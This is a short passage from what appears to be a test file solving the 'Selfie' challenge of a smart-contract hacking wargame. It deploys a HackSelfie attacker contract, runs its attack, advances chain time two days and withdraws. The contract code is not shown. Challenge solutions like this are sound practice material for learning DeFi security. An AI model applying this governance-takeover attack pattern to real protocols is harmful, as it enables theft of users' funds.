...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        const HackSelfieFactory = await ethers.getContractFactory("HackSelfie", deployer);
        this.hackSelfie = await HackSelfieFactory.deploy(this.pool.address, this.governance.address, this.token.address);
        await this.hackSelfie.connect(attacker).attack();
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
        await this.hackSelfie.connect(attacker).withdraw();
